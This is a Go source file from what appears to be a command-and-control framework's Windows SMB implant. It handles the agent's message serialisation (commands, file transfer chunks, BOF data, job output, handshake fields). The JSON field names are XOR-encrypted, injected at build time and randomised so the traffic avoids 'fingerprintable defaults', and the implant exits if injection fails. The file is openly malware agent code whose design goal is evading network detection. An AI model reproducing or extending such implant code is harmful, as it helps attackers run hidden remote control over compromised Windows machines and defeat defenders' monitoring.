// server/docker/payloads/SMB_Windows/json_fields.go
//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"os"
)

// JSON field names - injected at build time via ldflags (XOR encrypted)
// Decrypted at runtime using cfgKey from main.go

func init() {
	// Decrypt JSON field names at startup using cfgKey from main.go
	// cfgDec is defined in encryption.go and returns (string, error)

	// Initialize fallback values for any empty fields
	initJSONFields()
}
var (
	// Msg/Response fields
	jfCT string // CT
	jfCO string // Msg
	jfCI string // CID
	jfCB string // DID
	jfAI string // AID
	jfFN string // Filename
	jfOF string // OFN
	jfRP string // RemotePath
	jfCC string // CurrentChunk
	jfTC string // TotalChunks
	jfDA string // Data
	jfAR string // Arguments
	jfTS string // Timestamp
	jfJI string // JobID
	jfOU string // Output
	jfEC string // EC
	jfER string // Error

	// Template fields (used for server templates)
	jfV   string // Version
	jfT   string // Type
	jfTPL string // Templates
	jfP   string // Params

	// BOF-specific fields
	jfBD string // BOFData
	jfCD string // ChunkData

	// Handshake fields
	jfST string // Status
	jfNC string // NNID
	jfSI string // SInit
	jfSG string // Signature
	jfSD string // Seed
	jfCT2 string // PCfg (ct is taken, use ct2)
	jfET string // RunCfg
	jfMD string // Metadata
)

// MarshalJSON implements custom JSON marshaling for OpResp
// Uses dynamically-injected field names instead of struct tags
func (r *OpResp) MarshalJSON() ([]byte, error) {
	m := make(map[string]interface{})

	// Only include non-empty fields
	if r.Cmd != "" {
		m[secVal(jfCO)] = r.Cmd
	}
	if r.CID != "" {
		m[secVal(jfCI)] = r.CID
	}
	if r.DID != 0 {
		m[secVal(jfCB)] = r.DID
	}
	if r.AID != "" {
		m[secVal(jfAI)] = r.AID
	}
	if r.Filename != "" {
		m[secVal(jfFN)] = r.Filename
	}
	if r.RemotePath != "" {
		m[secVal(jfRP)] = r.RemotePath
	}
	if r.CurrentChunk != 0 {
		m[secVal(jfCC)] = r.CurrentChunk
	}
	if r.TotalChunks != 0 {
		m[secVal(jfTC)] = r.TotalChunks
	}
	if r.Data != "" {
		m[secVal(jfDA)] = r.Data
	}
	if r.Output != "" {
		m[secVal(jfOU)] = r.Output
	}
	if r.Error != "" {
		m[secVal(jfER)] = r.Error
	}
	m[secVal(jfEC)] = r.EC
	if r.Timestamp != "" {
		m[secVal(jfTS)] = r.Timestamp
	}
	if r.JobID != "" {
		m[secVal(jfJI)] = r.JobID
	}

	return json.Marshal(m)
}

// UnmarshalJSON implements custom JSON unmarshaling for Msg
// Accepts dynamically-injected field names
func (c *Msg) UnmarshalJSON(data []byte) error {
	var raw map[string]interface{}
	if err := json.Unmarshal(data, &raw); err != nil {
		return err
	}

	// Helper to get value with fallback field names
	getString := func(keys ...string) string {
		for _, k := range keys {
			if v, ok := raw[k].(string); ok {
				return v
			}
		}
		return ""
	}
	getInt := func(keys ...string) int {
		for _, k := range keys {
			if v, ok := raw[k].(float64); ok {
				return int(v)
			}
		}
		return 0
	}

	// Parse with dynamic field names (try injected first, then fallback to hardcoded)
	c.CT = getInt(secVal(jfCT), "ct")
	c.Cmd = getString(secVal(jfCO), "co")
	c.CID = getString(secVal(jfCI), "ci")
	c.DID = getInt(secVal(jfCB), "cb")
	c.AID = getString(secVal(jfAI), "ai")
	c.Filename = getString(secVal(jfFN), "fn")
	c.OFN = getString(secVal(jfOF), "of")
	c.RemotePath = getString(secVal(jfRP), "rp")
	c.CurrentChunk = getInt(secVal(jfCC), "cc")
	c.TotalChunks = getInt(secVal(jfTC), "tc")
	c.Data = getString(secVal(jfDA), "data")
	c.Arguments = getString(secVal(jfAR), "ar")
	c.Timestamp = getString(secVal(jfTS), "ts")
	c.JobID = getString(secVal(jfJI), "ji")

	return nil
}

// GetJSONFieldMapping returns the current field name mapping
// Maps randomized field names (keys) to standard field names (values)
// Server uses this to translate agent responses back to standard names
func GetJSONFieldMapping() map[string]string {
	return map[string]string{
		secVal(jfCT): "ct",
		secVal(jfCO): "co",
		secVal(jfCI): "ci",
		secVal(jfCB): "cb",
		secVal(jfAI): "ai",
		secVal(jfFN): "fn",
		secVal(jfOF): "of",
		secVal(jfRP): "rp",
		secVal(jfCC): "cc",
		secVal(jfTC): "tc",
		secVal(jfDA): "data",
		secVal(jfAR): "ar",
		secVal(jfTS): "ts",
		secVal(jfJI): "ji",
		secVal(jfOU): "ou",
		secVal(jfEC): "ec",
		secVal(jfER): "error",
	}
}

// initJSONFields validates that all JSON field names were injected at build time.
// No fallback defaults - if ldflags injection failed, the payload exits immediately.
// Called from init() in getEnv.go after decryption.
func initJSONFields() {
	// Validate all fields were injected - no fallbacks to fingerprintable defaults
	if secVal(jfCT) == "" || secVal(jfCO) == "" || secVal(jfCI) == "" || secVal(jfCB) == "" ||
		secVal(jfAI) == "" || secVal(jfFN) == "" || secVal(jfOF) == "" || secVal(jfRP) == "" ||
		secVal(jfCC) == "" || secVal(jfTC) == "" || secVal(jfDA) == "" || secVal(jfAR) == "" ||
		secVal(jfTS) == "" || secVal(jfJI) == "" || secVal(jfOU) == "" || secVal(jfEC) == "" ||
		secVal(jfER) == "" || secVal(jfV) == "" || secVal(jfT) == "" || secVal(jfTPL) == "" ||
		secVal(jfP) == "" || secVal(jfBD) == "" || secVal(jfCD) == "" || secVal(jfST) == "" ||
		secVal(jfNC) == "" || secVal(jfSI) == "" || secVal(jfSG) == "" || secVal(jfSD) == "" ||
		secVal(jfCT2) == "" || secVal(jfET) == "" || secVal(jfMD) == "" {
		os.Exit(1)
	}
}
